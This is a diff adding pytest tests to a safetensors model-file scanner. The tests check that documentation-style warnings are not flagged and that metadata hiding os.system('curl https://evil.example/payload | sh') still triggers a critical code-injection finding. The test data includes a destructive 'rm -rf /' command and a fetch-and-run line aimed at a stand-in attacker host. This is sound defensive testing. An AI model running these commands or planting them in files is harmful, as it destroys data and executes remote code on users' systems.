@@ -461,6 +461,53 @@ def test_unicode_metadata_is_not_code_injection(tmp_path: Path) -> None:
     assert [issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}] == []
 
 
+@pytest.mark.parametrize(
+    ("key", "value"),
+    [
+        ("description", "Security note: never invoke os.system('rm -rf /') or eval(user_input) in model hooks."),
+        (
+            "README",
+            "Example of unsafe code to avoid:\n```python\nimport os\nos.system('rm -rf /')\n```\nDo not execute this.",
+        ),
+    ],
+)
+def test_safetensors_documentation_examples_are_not_code_injection(tmp_path: Path, key: str, value: str) -> None:
+    file_path = tmp_path / "documented_security_example.safetensors"
+    data = {"t": np.arange(5, dtype=np.float32)}
+    save_file(data, str(file_path), metadata={key: value})
+
+    result = SafeTensorsScanner().scan(str(file_path))
+
+    assert result.success is True
+    assert not [
+        check
+        for check in result.checks
+        if check.name
+        in {
+            "SafeTensors Code Injection Detection",
+            "Metadata Code Pattern Check",
+            "Metadata Pattern Check",
+        }
+        and check.status == CheckStatus.FAILED
+    ]
+
+
+def test_safetensors_documentation_guard_does_not_hide_executable_metadata(tmp_path: Path) -> None:
+    file_path = tmp_path / "comment_padded_payload.safetensors"
+    data = {"t": np.arange(5, dtype=np.float32)}
+    metadata = {"description": "# Security note\nos.system('curl https://evil.example/payload | sh')"}
+    save_file(data, str(file_path), metadata=metadata)
+
+    result = SafeTensorsScanner().scan(str(file_path))
+
+    assert any(
+        check.name == "SafeTensors Code Injection Detection"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
 def test_literal_unicode_escape_metadata_still_flags_code_injection(tmp_path: Path) -> None:
     file_path = tmp_path / "escaped_payload_metadata.safetensors"
     data = {"t": np.arange(5, dtype=np.float32)}
